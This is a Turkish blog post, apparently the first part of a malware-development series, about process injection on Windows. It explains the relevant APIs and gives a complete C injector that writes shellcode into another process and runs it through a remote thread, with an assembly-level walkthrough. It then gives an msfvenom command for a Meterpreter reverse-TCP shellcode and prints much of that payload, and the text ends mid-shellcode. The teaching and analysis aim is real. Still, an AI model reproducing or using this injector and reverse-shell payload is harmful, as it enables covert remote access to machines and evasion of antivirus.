---
layout: post
title: MD 0x0 | Process Injection
description: Process Injection Attacks
tags: malware malware-development reverse-engineering process-injection
---

<style>
    h4 {
        /* in this blogs use h4 tags is description for images. */
        text-align: center;
        font-size: 14px;
        margin-bottom: 2%;
    }

    img {
        margin-top: 2%;
    }
</style>

## Introduction

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZNG1aJP-tlASpm6q8mdWBQ.png">

Merhabalar. Yeni başladığım Malware Development serisinin ilk bölümüne hoşgeldiniz. Bu serinin ilk konusu olarak Process Injection konusuna değineceğim.

Bu seride amaçladığım şey de sizlere basit bir Process Injection senaryosu göstermekle beraber, bu tür basit malware’ları nasıl Assembly kodları ile analiz yapabileceğinizi basit bir şekilde anlatmaya çalışacağım. Yani bu seride okuyucunun beyni yakılması amaçlanmıştır.

## Sorumluluk Reddi

Sorumluluk reddi alarak; bu seri tamamen eğitim amaçlıdır yani farklı bir deyişle This is for educational purposes only. Bu seride anlatım için tamamen sanal makineler kullanılacaktır yani güvenli ortamlar üzerinde testler yapılacaktır. Dolayasıyla uygulayacılara da aynısını yapmasını öneriyorum. Gerçekleştireceğiniz gerçek senaryoların sorumluluğu sizlere aittir.

## Gereksinimler

MD serisi için sizlerden istediğim temel seviyede C bilgisi ve en azından okuyabileceğiniz kadar Assembly bilginiz olması.

## 0x0 — Nedir Bu Processler?

Yok öyle beleşten hemen process Injection’u anlayım falan. Buraya geldiyseniz o beyinler yanacak.

Kabaca Processler, işletim sistemi tarafından herhangi bir programın yürütülmesi için oluşturulan çalışma birimleridir. Eğer bir program, kullanıcı veya İşletim Sistemi (OS) tarafından çalıştırılmak istenirse, öncelikle İşletim Sistemi tarafından belleğe yüklenir ardından yine İşletim Sistemi tarafından bu programın yürütülmesi için bir process oluşturulur. En sonda ise belleğe yüklenen programın bellek alanı, Process tarafından temsil edilir ve programın içerdiği komutları çalıştırılmaya başlanır.

Arayüz ortamında gördüğünüz herhangi bir programın dosyaları (kabaca program kodları), kullanıcı veya işletim sistemi tarafından çalıştırılmadığı sürece pasif halde olur. Eğer hedef program çalıştırılmak istenirse, önce diskten belleğe aktarılır ardından aktarılan bu kodlar yürütülmeye başlanır. Bu esnada ise program aktif hale gelmiş olur.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*sUbHOymvfHoH_uGqGXcPeQ.png">
<h4> Linux ortamında htop aracığıyla görüntülenen bir process listesi </h4>

## 0x1 — Thread’ler

> Bir Process, en basit ifadeyle, yürütülmekte olan bir programdır. Process bağlamında bir veya daha fazla thread çalışır. Thread ise işletim sisteminin işlemci zamanını tahsis ettiği temel birimdir. Bir Thread, başka bir thread tarafından yürütülmekte olan kısımlar da dahil olmak üzere, işlem kodunun herhangi bir bölümünü yürütebilir. 
— <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads"> Microsoft Learn - Process and Threads </a>

Process’lere göre daha hızlı ve hafif olan Thread’ler, kabaca tanımıyla İşletim Sisteminde bağımsız olarak çalışan birimlerdir. Herhangi bir process içerisinde bir veya daha fazla thread olabilir. Dolayasıyla Process’ler, Thread’ler sayesinde birden fazla işi aynı anda yapabilir.

Thread aracılığıyla Process’lerin birden fazla işi aynı anda yapılabileceğinden bahsettim. Bunu biraz daha detaylandıralım. Örneğin bir web tarayacısı düşünün. Bu web tarayıcısının bir thread ile kullanıcının arayüzle etkileşimi yönetilirken diğer thread’ler ile arka planda web sayfaları yüklemek gibi işlemleri aynı anda gerçekleştirebilir.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*RVtaQpjRT3f5XXv_5dU5ig.png">
<h4> Task Manager aracılığıyla görüntülenen Firefox Process’in Thread’leri (17 tane) </h4>

## 0x2 — Windows.h Kütüphanesi ve Bazı API’lar

Bu eğitim serisinde sıklıkla kullanacağımız windows.h kütüphanesini ve Process Injection senaryosunda kullanacağımız gerekli API’ları tanıyalım. Bu kısım biraz sıkıcı olduğu için burayı geçebilirsiniz veya dilerseniz kodları incelediğinizde burayı kullanabilirsiniz.

windows.h kütüphanesi, C ve C++ dilleri için Windows API’larını içeren bir başlık dosyasıdır. Windows API’ları, Microsoft Windows işletim sisteminin çeşitli işlevlerine erişim sağlayan programlama arabirimleridir.

Tabi ki bu kütüphane içerisinde birçok API barınmaktadır. Dolayasıyla burada hepsini bahsetmem mümkün değil. Dolayasıyla bu 0x0 part’ında kullanacağımız API’lardan bahsedeceğim sadece.

### OpenProcess()

OpenProcess(), İşletim Sistemi içerisinde çalışan herhangi bir Process’i açmamızı sağlayan bir API’dir. Bu API’yi kullanarak açtığımız Process’in HANDLE’ını elde edebiliriz.

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```

### VirtualAllocEx()

VirtualAllocEx(), İşletim Sistemi içerisinde çalışan herhangi bir Process’in belleğinde yer ayırmamızı sağlayan bir API’dır.

```cpp
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

### WriteProcessMemory()

Belirlenen Process’in bellek alanına veri yazmak için kullandığımız bir API’dır. Ancak veri yazılacak alana tamamen erişiminiz olması lazım aksi takdirde veri yazma işlemi başarısız olur.

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

### CreateRemoteThreadEx()

Başka bir Process’in sanal alanında bir thread oluşturmamızı sağlayan ve çalıştırmamızı sağlayan bit API’dır.

```cpp
HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);
```

### WaitForSingleObject()

Belirtilen nesne sinyali (kabaca hareketi) durumu gerçekleşene kadar programı bekleten bir API’dır. Bu API’yi, Thread’ın durumunu izlemek için kullanacağız.

```cpp
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
);
```

<h2> 0x3 — Process Injection Attack </h2>

Yepp, temel şeyleri anladık şimdi saldırının nasıl gerçekleştirildiğini daha kolay anlayabileceğiz.

Process Injection saldırısı, bir saldırganın, çalışan herhangi bir Process’e kendi zararlı kodunu enjekte ederek sisteme saldırmayı hedefleyen bir saldırı türüdür. Bu saldırı, çoğunlukla antivirüs programlarına yakalanmamak için kullanılır ve birden fazla teknikleri bulunmaktadır. Tekniklerden bir kaçını aşağıda sırayalım:

* Process Doppelgänging
* Process Hollowing
* DLL Injection
* AtomBombing
* Thread Execution Hijacking

Bu saldırı tekniklerinin açıklamarına bu konuda yer vermeyeceğim. İlerideki serilerimde bunları tek tek detaylandıracağım.

Yukarıda bahsettiğim gibi, çalışacak programlar için bellekte yer ayrıldığını ve İşletim Sistemi tarafından oluşturulan Process’in bu belleği temsil ettiğini söylemiştim. İşte bu saldırıda ise hedef Process’in belleğine erişim sağlayıp ardından bu bellek içerisinde bir yer ayırıp içerisine zararlı kodu enjekte edilir. Bu part’ta ilerleyeceğimiz senaryoda ise en sonda bir Thread oluşturup bu zararlı kodu çalıştırmasını sağlayacağız.

<h2> 0x4 — Process Injection için Senaryo </h2>

Evet asıl konumuza geldik yani kuru fasulyenin faydalarına….

Bu örnek senaryo da iki tane sanal makine kullanacağım. Biri, hedef sistem olarak windows x64 işletim sistemi ve saldırgan sistem olarak kali x64 sistemi kullanacağım.

Senaryo için C ile Process Injection için bir kod parçası yazacağız ardından senaryodan önce malware’in assembly karşılığını kontrol edeceğiz ve en sonunda ise sonucu göreceğiz.

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* Messages */
char e[] = "[-]";
char s[] = "[+]";
char i[] = "[*]";

/* Shellcode */
unsigned char bekoShell[] = "\x41\x41\x41\x41"

int main(int argc, char const *argv[]) {
    if (argc < 2) {
        /* Eğer Program, parametre verilmeden çalıştırılırsa, Programı hata mesajına yönlendiriyoruz ardından programı bitiriyoruz. */
        printf("%s Usage: .\\injector.exe <PID>\n", e);
        return EXIT_FAILURE;
    }
    DWORD PID = atoi(argv[1]);
    
    /* Kullanıcıdan Alınan Process ID'i kullanarak hedef process'i tam yetki ile açıyoruz. */
    HANDLE hProcess = NULL;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        /* Eğer OpenProcess fonksiyonun geri dönüş adresi NULL olursa hata mesajına yönlendiriyoruz. */
        printf("%s Failed to open the process! Error Code: 0x%lx\n", e, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Target Process is Open! PID: %ld\n", i, PID);

    /* Hedef Process'in bellek alanında shellcode için yer ayırıyoruz. */
    LPVOID remoteBuffer;
    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(bekoShell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        /* Eğer VirtualAllocEx işlemin geri dönüş adresi NULL dönerse programı hata mesajına yönlendiriyoruz. */
        printf("%s Failed to Allocate at %p Memory Address! Error Code: 0x%lx\n", e, remoteBuffer, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Allocated %zu-bytes to %p Address!\n", i, sizeof(bekoShell), remoteBuffer);

    /* Bellek alanında yer ayırdığımız alana shellcode'u yerleştiriyoruz. */
    WriteProcessMemory(hProcess, remoteBuffer, bekoShell, sizeof(bekoShell), NULL);
    printf("%s Shellcode was written on the Target Process!\n", i);

    /* Yerleştirdiğimiz Shellcode'u çalıştırmak için uzaktan çalıştırılabilen bir RemoteThread oluşturuyoruz. */
    HANDLE hThread = NULL;
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, 0, NULL);
    if (hThread == NULL) {
        printf("%s Failed to Create Thread! Error Code: 0x%lx\n", e, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Created Remote Thread!\n", i);
    printf("%s Waiting for the shellcode to be executed....\n", i);

    /* Oluşturulan Thread'in uzaktan komutu çalıştırılması için Programı beklemeye alıyoruz. */
    WaitForSingleObject(hThread, INFINITE);

    printf("%s Yeaap! Shellcode is executed! Good Bye :>\n", s);
    return EXIT_SUCCESS;
}
```

Basit kod parçası budur. Senaryomuza geçmeden önce kodların Assembly kısmına bakarak programın ne yaptığını bir anlamakla başlayacağız. “Neden C kodlarıyla değil de Assembly kodları ile anlatıyorsun?” diyenleriniz olacaktır. Bu seride amaçladığım şeyden biri de bu tür malware’ları nasıl analiz edebileceğinizdir. Dolayasıyla gerçek bir analizde elinizde source code olmayacağı için programı Assembly kodlarına bakmanız gerekecektir.

Eğer hayattan soğumaya hazırsanız hadi başlayalım:

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*AcF38FmKQvUP1EPoGLsNug.png">
<h4> main Location </h4>

Programın başlangıcına baktığımızda, “function prologue” adı verilen işlemlerin gerçekleştiğini görüyoruz. Bundan sonra da, kullanıcı programı başlatılırken kullandığı parametre sayısı rbp+arg_0 adresine aktarılıyor. rbp+arg_8 adresine ise kullanıcıdan aldığımız PID değeri aktarılıyor. Bu kısımda biraz kafanız karışmış olabilir biraz detaylandırayım.

Örnek olarak malware’i şu şekilde başlattığınızı varsayalım:

```shell
./injector 670
```

Buradaki .\injector.exe ve 670 bir parametredir. Parametre sayımları 0,1 diye gider. Yani .\injector.exe 0. parametreyi temsil ederken kullanıcının PID olarak verdiği 670 parametresi ise 1. parametre olarak temsil edilir. Devamında ise 2,3,4… diye gider. Programlama Dillerindeki Array dizilimi gibi düşünün.

Ancak önemli bir nokta ise bu alınan parametreler her zaman string olarak ele alınır. Evet, biz malware’da 670 gibi bir integer değerler giriyoruz ancak her ne kadar da biz Integer bir değer girsek de arka planda bu string olarak ele alınıyor. Dolayasıyla C kodlarına bakarsanız atoi fonksiyonuyla alınan PID değerin Integer’a çevrildiğini göreceksiniz.

Daha sonra cmp ile rbp+arg_0 adresindeki değerin kontrol edildiğini görüyoruz. Hatırlayın, bu adresde, kullanıcının verdiği parametre sayısı tutulmakta. Kontrolde, eğer bu adresdeki değer 1'den büyükse (jg kullanılmış yani Jump Greater anlamına gelir) program loc_1400015CE konumuna yönlendiriliyor. Burası da bizim programın devam edeceği kısım. Eğer 0'dan küçük ise hata mesajına yönlendirilerek program bitiriliyor.

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*87EEDg8H7HMenQADtARKnA.png">
<h4> loc_1400015CE Location </h4>

Bu kısımdaki ilk kodlarımıza baktığımızda başta rax register’ına rbp+arg_8 adresindeki değer aktarılıyor. Burada, kullanıcının parametre olarak girdiği Hedef Process’in ID’si bulunmaktadır. rax’a aktarılma nedeni de, alınan PID, integer’a çevrilmek için atoi fonksiyonuna verilecek olmasıdır. Daha sonra rax registeri 8 byte arttırılıyor ve ardından rax’ın 8 byte arttırılmış değeri adres olarak tekrar rax’a aktarılıyor. Daha sonra ise rcx’e rax register içerisindeki değerin son hali aktarılıyor ve program atoi fonksiyonuna gidiyor. Yani bu kısımda kabaca parametrenin Integer’a çevrildiğini anlayabilirsiniz.

Daha sonraki işlemlerine baktığımızda OpenProcess’in fonksiyon olarak çağrıldığını görüyoruz dolayasıyla ondan önceki işlemlerinde parametre hazırlığı olduğunu anlayabiliriz.

rbp+dwProcessId adresine eax’ın değeri aktarılıyor. Burada parametre olarak verilen PID değerin Integer hali saklanmaktadır. Daha sonra r8d register’a OpenProcess’in bir parametresi olarak eax’ın değeri aktarılıyor. Ondan sonra edx’e ise 0 değeri aktarıldığını görüyoruz. Buradaki 0, muhtemelen ya OpenProcess’e 2. parametre olarak parametre olarak FALSE veya NULL değeri verilmesinden kaynaklıdır.

Daha sonra ecx’e baktığımızda 1FFFFFh değeri aktarıldığını görüyoruz. 1FFFFFhdeğeri, Windows işlem yönetimi işlevlerinde kullanılan PROCESS_ALL_ACCESS sabitine karşılık gelir. Bu değer, process’e tam erişim hakkını temsil eder. Bu, bütün 32 bitin 1 olduğu bir değeri ifade eder: 0001 1111 1111 1111 1111 1111 1111 1111 (binary). Bu haklar, işlemi başlatma, durdurma, bellek alanlarına erişim ve diğer çeşitli işlem yönetimi görevlerini gerçekleştirmeyi sağlar.

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Uiad7LVb-hf4PDuL3lhhag.png">
<h4> loc_1400015CE Location </h4>

Daire içerisindeki işlemlere baktığımızda OpenProcess’in adresi rax’a aktarılmaktadır. Daha sonra bu aktarılan adres ile Program oraya yönlendiriliyor.

Program tekrar loc_1400015CE adresine döndüğünde rbp+hProcess adresine rax’ın değeri aktarılıyor. Burada aktarılan değer, OpenProcess’in geri dönüş adresi bulunmaktadır. En sonda ise cmp ile bu Adres içerisindeki değer kontrol ediliyor. Eğer 0 (yani NULL) eşit değilse program (jnz kullanılmış yani Jump not Zero) loc_14000163F konumuna yönlendiriliyor.

Yani bu şuana kadar ki işlemlerin sonucunda kullanıcıdan alınan Process ID ile ve Tüm yetkilerle Process’in açıldığını görmekteyiz.

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*98z0zY0atH1dL3YOc8biQg.png">
<h4> loc_14000163F Location </h4>

Bu konuma baktığımızda, öncelikle Integer’a çevrilmiş PID verisi eax’a aktarıldığını görüyoruz. Bunun sebebini anlamak için ilerideki kodlarda çağırılan printf fonksiyonundan anlayabiliriz. “Target Process is Open! PID: %s” mesajı ekrana bastırılırken kullanıcının girdiği PID değeriyle ekrana bastırılıyor.

İlerideki kodlara baktığımızda VirtualAllocEx fonksiyonun çağrıldığını görmekteyiz. Yani açılan process içerisinde bir bellek ayrımı yapılacağını anlayabiliriz. Şimdi kodları buna göre inceleyelim.

İlk başta VirtualAllocEx’in flProtect parametresi olarak rsp+60h+flProtect adresine 40h değer ekleniyor. Bu 40h, PAGE_EXECUTE_READWRITE değerine eş gelmektedir:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*vHgLrNxTxN769_I50TJwsQ.png">
<h4> Kaynakça için <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">buraya</a> tıklayabilirsiniz. </h4>

Aklınızda bulunsun, bir malware’i analiz ederken böyle farklı değerlere denk gelirseniz kesinlikle microsoft gibi dökümanlardan yararlanın.

Buna göre, bu malware’in hedef process içerisinde oluşturduğu sanal bellek içerisindeki kodda 3 yetkiye (Okuma, Yazma ve Çalıştırma) sahip olduğunu anlayabiliyoruz.

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*xnHX07MrBjvGzNzNnmxUNQ.png">
<h4> VirtualAllocEx Parametreleri </h4>

Kaldığımız yerden devam edelim.

r9d register’a 3000h değeri atandığını görmekteyiz. Bu, VirtualAllocEx’de flAllocationType parametresi içindir. Bu parametre, bellekte yer ayırmak istediğimiz türü belirleriz. “Peki 3000h neye denk geliyor?” diye sorabilirsiniz. Hemen Microsoft’un dökümanından bir kaçına bakalım:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*RHCc4IDonEjfezIZQIMpQw.png">
<h4> Dökümana ulaşmak için <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">buraya</a> tıklayabilirsiniz. </h4>

**“Eee! Burada 0x00003000 yok!”** diyenleriniz olacak. Hemen açıklayım.

Yukarıda C kodunda, biz bellek ayrım türü için 2 tane bayrak kullandık (MEM_COMMIT ve MEM_RESERVE) ve bu bayrakların binary karşılıklarının bitwise or sonucunun hex karşılığını görmekteyiz yani 3000h. Ancak bu kodu bilmediğimizi düşünerek hareket edersek, bu bayrakların olduğunu nasıl anlayabiliriz bundan bahsedeceğim. Kafanız karışmış olabilir ama şimdi detaylandıracağım.

Öncelikle bu iki bayrağın Hex karşılıklarına baktığımızda 0x00001000 ve 0x00002000 değerlerini görüyoruz. Bu tip konularda bu hex değerleri binary’e çevirip bitwise OR işlemine tabi tutarak ne olduğunu anlayabiliriz. Bitwise OR işlemine tabi tutmamızın nedeni de arka planda bunun gibi parametrelerin binary değerleri Bitwise OR işlemi sonucuyla işlemler yapılması. Dolayasıyla bilmediğiniz bir malware’i analiz ettiğinizde böyle fonksiyon parametrelerine denk geldiğinizde gerekli işlemler yaparak ne olduğunu anlayabilirsiniz.

Eğer buraya kadar hayattan soğuduysanız ve daha da hayattan bıkmak istiyorsanız değerleri nasıl bulacağımıza geçelim! Let’s goo!

Her şey den önce bitwise OR’u tanıyalım:

> "Bitwise OR, bilgisayar programlamasında kullanılan bir operatördür. Bu operatör, iki sayının her bir bitini karşılaştırır ve en az birinin 1 olduğu bitleri 1 olarak ayarlar.”

Yani kısaca iki sayının bitleri alt alta karşılaştırılır. Karşılaştırılmada herhangi bitin 1 olması sonucu 1 yapar. Mesela 5 (101) ve 8 (1000) rakamların binary karşılıklarının bitwise or işlemi ile sonucuna bakalım:

```
  1000 (8)
OR
  0101 (5) --> bit eksikliği olduğu için en sona 0 ekliyoruz.
  ----
  1101 (13)
```

Gördüğünüz gibi tek tek bitleri karşılaştırdığımızda herhangi birinde 1 olması sonucu 1 yapıyor. Parantez içerisinde gördüğünüz sayılarda decimal karşılığı. Yani sonucumuz 13. Eğer bunu anladıysak şimdi ise bunu bayraklarımızda deneyelim.

Öncelikle MEM_COMMIT ve MEM_RESERVE bayrakların hex karşılıklarını binary’e çevirelim:

* 0x00001000 → 00000000000000000001000000000000

* 0x00002000 → 00000000000000000010000000000000

Bu tip çözümlerden önce hex değerleri binary’e çevirin. Bunu da online siteler ile yapabilirsiniz.

Şimdi ise bitwise or işlemine geçelim:

```
  00000000000000000001000000000000
OR
  00000000000000000010000000000000
  --------------------------------
  00000000000000000011000000000000
```

Sonuca baktığımızda 00000000000000000011000000000000 değerini bulduk. Şimdi ise bunu hex değerine çevirelim ve sonuca bakalım:

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ctbWuV2mQOzgr0sQjtmWDw.png">
<h4> Bitwise OR Sonucu </h4>

WOAHH! Gördüğünüz gibi sonuç 3000 çıktı. Böylece sonucu da görmüş olduk.

Buradan şunu anlayabiliriz ki bir malware analizinde VirtualAllocEx’in parametrelerine göz attığınızda bundan farklı değerler de görebilirisinz mesela 3000h değil de 82000h değeri gibi. Sonucu bulmak için de bayrakların hex’lerin binary karşılıklarını bitwise or işlemi ile sonucu elde edip hangi bayrakların olduğunu tespit edebilirsiniz.

Tabi ki sadece VirtualAllocEx için anlatmadım buradaki yöntemi. Bilip bilmediğim diğer fonksiyon parametreleri için de bu yöntemi uygulayabilirsiniz. Eğer parametre olarak hex değeri görürseniz bunu uygulayabilir ardından dökümanlar ile hangi parametrenin olduğunu anlayabilirsiniz ya da “ben hayatımdan memnun bir bireyim” diyorsanız da yapay zekalara direkt çözdürebilirsiniz.

Okayyy! Hayatınızdan bir nebze olsa bile sizi soğuttuysam kaldığımız yerden devam edelim:

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*k6qpyNDpyyg7GKJD1MzaPA.png">
<h4> VirtualAllocEx Parametreleri </h4>

Ondan sonra ise r8d register’a 5 değeri aktarıldığı görülüyor. Bu, hedef Process içerisinde yer ayrılacak olan bellek alanın boyutu. Burada 5 gözüküyor ancak siz shellcode gibi şeyler yerleştirdiğinizde 512 byte gibi bir yer ayrılabilir.

Ondan sonra ise edx’e 0 verildiğini görülmektedir. Bu parametre ise yer ayırdığımız belleğin başlangıç adresini göstermektedir (lpAddress). 0 ise NULL’u temsil etmektedir. Yani bu fonksiyonda başlangıç adresine NULL değerini verirseniz yer ayrılan bellek bölümüne sistem tarafından otomatik bir başlangıç adresi atanacaktır.

Daha sonrada rax register’a yukarıda OpenProcess’da bahsettiğimiz gibi VirtualAllocEx fonksiyonun başlangıç adresi aktarılmaktadır. En son ise rax’ aktarılan adres ile program oraya yönlendiriliyor.

Program tekrar loc_14000163F konumuna döndüğünde de rbp+lpBaseAddress adresine rax aracılığıyla VirtualAllocEx’in başlangıç adresi aktarılıyor. Eğer sonuç NULL değilse program loc_1400016C8 konumuna gidiyor. Bunu artık ilerideki kodlarda bahsetmeyeceğim artık anlamışsınızdır diye düşünüyorum.

Bunlara göre bu kodun decompiler edilmiş hali şu şekilde olacaktır:

```cpp
VirtualAllocEx(hProcess, NULL, 5, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*MKC-ZtoeFOkssJbZe__9eA.png">
<h4> loc_1400016C8 Location </h4>

Bu kısmın ilk kodlarına baktığımızda ilk olarak VirtualAllocEx ile sanal olarak yer ayırdığımız bellek alanın başlangıç adresi rax register’ına aktarılıyor. Bunun sebebi ise aşağıdaki kodlardan gördüğümüz üzere “Allocated %zu-bytes to %p Address” mesajını bastırmak için bu adresi alıyor ve ardından shellcode uzunluğunu da ekrana bastırmak için r8d register’a da 5 değeri aktarılıyor. Sonra da printf fonksiyonuna gidiliyor.

Biraz ilerideki kodlara göz attığımızda WriteProcessMemory fonksiyonun çağırıldığını görüyoruz. Yani, VirtualAllocEx ile ayrılan bellek alanına veri yazacağını anlayabiliriz.

Öncelikle rdx’e Process’in belleğinde yer ayırdığımız bellek alanın başlangıç adresi atanıyor. Ardından rax’a OpenProcess’in başlangıç adresi de atanıyor. Sonra WriteProcessMemory’in son parametresi olan lpNumberOfBytesWritten’a parametre olarak 0 (yani NULL) aktarıldığını görüyoruz. Ardından alana yazdırılacak verinin 5 boyutunda olduğunu görmekteyiz; çünkü r9d register’a yazılacak verinin boyutu aktarılıyor.

Ardından r8 register’a yazdırılacak verinin kendisini görüyoruz yani ‘AAAA’. Ben örnek kodda \x41\x41\x41\x41 yazdığım için böyle. İlerideki dakikalarda koda bir payload koyacağız.

Son olarak ise rcx’e rax’ın değeri yani OpenProcess’in başlangıç adresi ekleniyor. Daha sonra ise program WriteProcessMemory fonksiyonuna yönlendiriliyor.

Yani bu komutun decompiler’i şu şekildedir:

```cpp
WriteProcessMemory(hProcess, rbp+lpBaseAddress, "AAAA", 5, NULL)
```

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9iEdrtjtvt0uRAEexiL7pw.png">
<h4> loc_1400016C8 Location </h4>

Kaldığımız yerden devam edersek; program tekrar bu konuma döndüğünde bir mesajı bastıracağını görmekteyiz çünkü ilerideki kodlarda printf fonksiyonu çağırılıyor: “Shellcode was Written on the Target!\n”

Bundan sonraki işlemlerde CreateRemoteThreadEx Fonksiyonu için işlemler yapıldığını görmekteyiz.

Öncelikle rbp+hHandle adresine 0 atandığını görmekteyiz. Ondan sınra ise fonksiyonda parametre olarak kullanılması için önce rdx’e oluşturulan bellek alanın başlangıç adresi aktarılmaktadır ardından hProcess’in adresi ise rax’a aktarılmaktadır. Ondan sonraki gelen parametrelere ise 0 verildiğini görüyoruz. Bu kodun decompiler’i şu şekildedir:

```c
hThread = CreateRemoteThreadEx(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)rbp+lpBaseAddress, 0, 0, 0, 0);
```

<img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*M2pqcyck_Xmg7Ou40U7jcg.png">
<h4> loc_140001776 Location </h4>

Buradaki kodlara baktığımızda birçok sayıda ekrana mesaj bastırıldığını ve ilerideki kodlarda WaitForSingleObject fonksiyonun çağırıldığını görmekteyiz. Bu ise uzaktan yerleştirilen zararlı kodun execute edilene kadar programın duraksayacağını göstermektedir. Fonksiyonu anlamak için yukarıdaki bahsedilen API hakkında bilgi alabilirsiniz.
0x5 — Senaryonun gerçekleştirilmesi

Az da olsa sizlere nasıl basit bir malware’in analiz edilebileceğinden bahsettim. Artık bu kadar çileden sonra bu beklediğimiz senaryoyu gerçekleştirelim.

Öncelikle shellcode oluşturmak için kali ortamında msfvenom’u kullanalım:

```shell
msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<SALDIRGAN IP ADDRESS> LPORT=443 EXITFUNC=thread -f c --var-name=bekoShell
```

Bu komut ile oluşturduğumuz shellcode ile hedef sisteme erişim için bir meterpreter kabuğu oluşturacaktır. Çıktı şu şekilde olmalı:

```shell
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x56\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48"
"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
"\x40\x20\x49\x01\xd0\x50\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9"
"\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
"\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48"
"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
"\x49\xbc\x02\x00\x01\xbb\xc0\xa8\xc6\x81\x41\x54\x49\x89\xe4"
"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"
"\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
"\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40"
